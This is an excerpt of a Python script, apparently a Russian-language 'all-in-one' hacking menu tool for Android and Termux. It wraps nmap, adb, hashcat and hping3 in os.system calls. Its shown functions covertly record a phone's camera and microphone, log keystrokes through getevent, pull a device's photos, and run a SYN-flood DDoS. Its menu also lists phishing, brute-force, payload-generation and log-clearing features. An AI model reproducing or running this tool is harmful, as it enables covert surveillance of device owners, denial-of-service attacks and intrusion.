...
def install_all():
    ...
    os.system('pip install requests pycryptodome python-nmap colorama psutil')
    os.system('pkg install hydra aircrack-ng hashcat -y 2>/dev/null')
    print("✅ ГОТОВО!")

# СЕТЬ
def scan_ports(): os.system(f'nmap -T4 -F {input("🎯 Цель: ").strip()}')
def scan_deep(): os.system(f'nmap -T4 -A -O {input("🎯 Цель: ").strip()}')
def scan_wifi():
    if sys.platform == 'win32': os.system('netsh wlan show networks')
    else: os.system('termux-wifi-scaninfo')
def arp_scan(): os.system('arp -a')
def fake_ap():
    ssid = input("📶 Название: ").strip() or "Free_WiFi"
    print(f"📱 Включи точку в Настройках Android:\n   Имя: {ssid}\n   Защита: Открытая")
def sniff_http():
...
def save_stream():
    ...
    url = f"rtsp://{cam['ip']}:{cam['port']}/live" if cam['port'] in [554,8554] else f"http://{cam['ip']}:{cam['port']}/video"
    print(f"📹 Запись 60 сек... Ctrl+C стоп")
    try: os.system(f'ffmpeg -i "{url}" -t 60 -c copy "{output}" 2>/dev/null'); print(f"✅ {output}")
    except KeyboardInterrupt: print(f"\n✅ {output}")

# УСТРОЙСТВА
def adb_connect(): os.system(f'adb connect {input("📱 IP: ").strip()}:5555')
def adb_wireless():
    ip = input("📱 IP: ").strip(); os.system(f'adb tcpip 5555'); time.sleep(1)
    os.system(f'adb connect {ip}:5555'); print("✅ Wi-Fi")
def extract_android():
    os.system(f'adb pull /sdcard/DCIM {DATA}/extracted/')
    os.system(f'adb pull /sdcard/Download {DATA}/extracted/')
    print(f"✅ {DATA}/extracted/")
def screenshot(): os.system(f'adb exec-out screencap -p > {DATA}/screen.png'); print("✅")
def screen_record():
    os.system(f'adb shell screenrecord /sdcard/screen.mp4 --time-limit 30')
    os.system(f'adb pull /sdcard/screen.mp4 {DATA}/'); print(f"✅ {DATA}/screen.mp4")
def install_apk(): os.system(f'adb install {input("📦 APK: ").strip()}'); print("✅")
def hidden_camera(): print("📷 (root)"); os.system('adb shell su -c "am start -n com.android.camera/.Camera --ez extra_hide_ui true" 2>/dev/null')
def hidden_mic(): print("🎤 (root) 30 сек"); os.system(f'adb shell su -c "arecord -d 30 {DATA}/audio.wav" 2>/dev/null')
def keylogger():
    print("⌨️ (root) 30 сек")
    os.system(f'adb shell su -c "getevent -lt /dev/input/event0" > {DATA}/keys.txt 2>&1 &')
    time.sleep(30); os.system('adb shell su -c "killall getevent" 2>/dev/null'); print(f"✅ {DATA}/keys.txt")
...
def hash_crack(): os.system(f'hashcat -m 0 {input("📄 Хеш: ").strip()} {input("📚 Словарь: ").strip()}')
def search_cve(): os.system(f'searchsploit {input("🔍 Софт: ").strip()}')
def ddos(): os.system(f'hping3 -S --flood -V {input("🎯 IP:порт: ").strip()}')
def gen_payload():
...
def tor_start(): print("🧅 Tor..."); os.system('tor &'); time.sleep(3); print("✅ 127.0.0.1:9050")
def vpn_check(): print("🌍 IP:"); os.system('curl -s ifconfig.me 2>/dev/null'); print()
...
# ДАННЫЕ
def recover_files():
    for root, dirs, files in os.walk(input("📁 Путь: ").strip()):
        for f in files:
            if f.endswith(input("📝 Расширение: ").strip()): print(f"  📄 {os.path.join(root, f)}")
...
def metadata(): os.system(f'exiftool {input("📷 Фото: ").strip()}')
def stego_hide():
    ...
    print(f"✅ {out}")
def stego_extract(): os.system(f'steghide extract -sf {input("📷 Картинка: ").strip()}')
def hidden_folder():
...
# СЕРВИСЫ
def whois_lookup(): os.system(f'whois {input("🌐 Домен: ").strip()}')
def ngrok_start(): os.system(f'ngrok http {input("🔌 Порт: ").strip() or "8888"}')
...
def main():
    print("""
╔══════════════════════════════════════╗
║  🔧 ALL-IN-ONE TOOL v4.0          ║
║  47 функций | FFmpeg | Авточистка  ║
╚══════════════════════════════════════╝
""")
...
╠══════════════════════════════════════╣
║            📱 УСТРОЙСТВА             ║
║  10.ADB USB    │  11.ADB Wi-Fi      ║
║  12.Извлечь    │  13.Скриншот       ║
║  14.Запись экр │  15.Установить APK ║
║  16.Камера(r)  │  17.Микрофон(r)    ║
║  18.Кейлогер(r)                     ║
╠══════════════════════════════════════╣
║            🔓 ВЗЛОМ                  ║
║  19.Брут HTTP  │  20.Брут SSH       ║
║  21.Хеш        │  22.Поиск CVE      ║
║  23.DDoS       │  24.Payload        ║
║  25.Фишинг                          ║
╠══════════════════════════════════════╣
║            🛡️ ЗАЩИТА                 ║
║  26.Чистка     │  27.Смена MAC      ║
║  28.Проверка   │  29.Tor            ║
║  30.Мой IP     │  31.Полная чистка  ║
║  32.Невидимка                       ║
╠══════════════════════════════════════╣
║            📡 RFID/NFC               ║
║  33.Клон RFID  │  34.Чтение с тел   ║
╠══════════════════════════════════════╣
║            🔍 OSINT                  ║
║  35.Поиск инфо │  36.Поиск по фото  ║
╠══════════════════════════════════════╣
║            ⚡ АВТО                   ║
║  37.Авто-атака │  38.Мониторинг     ║
╠══════════════════════════════════════╣
║            💾 ДАННЫЕ                 ║
║  39.Восстанов. │  40.Шифрование     ║
║  41.Дешифровка │  42.Метаданные     ║
║  43.Стего(hide)│  44.Стего(extract) ║
║  45.Скрытая папка                   ║
╠══════════════════════════════════════╣
║            🌐 СЕРВИСЫ                ║
║  46.WHOIS      │  47.Ngrok          ║
...
""")
        ...
        c = input('>>> ').strip()
        actions = {
            '1':scan_ports,'2':scan_deep,'3':scan_wifi,'4':arp_scan,'5':fake_ap,
            '6':sniff_http,'7':sniff_dns,'8':find_cameras,'9':view_cameras,
            '10':adb_connect,'11':adb_wireless,'12':extract_android,
            '13':screenshot,'14':screen_record,'15':install_apk,
            '16':hidden_camera,'17':hidden_mic,'18':keylogger,
            '19':bruteforce_http,'20':bruteforce_ssh,'21':hash_crack,
            '22':search_cve,'23':ddos,'24':gen_payload,'25':phishing_page,
            '26':clear_logs,'27':change_mac,'28':check_root,'29':tor_start,
            '30':vpn_check,'31':full_clean,'32':stealth_mode,
            '33':rfid_clone,'34':rfid_phone,'35':osint_search,'36':osint_photo,
            '37':auto_attack,'38':auto_monitor,'39':recover_files,
            '40':encrypt_file,'41':decrypt_file,'42':metadata,
            '43':stego_hide,'44':stego_extract,'45':hidden_folder,
            '46':whois_lookup,'47':ngrok_start,'98':install_all,'99':self_destruct
        }
        if c == '0': break
        elif c in actions: safe_run(actions[c])
        else: print('❌ Неверно')
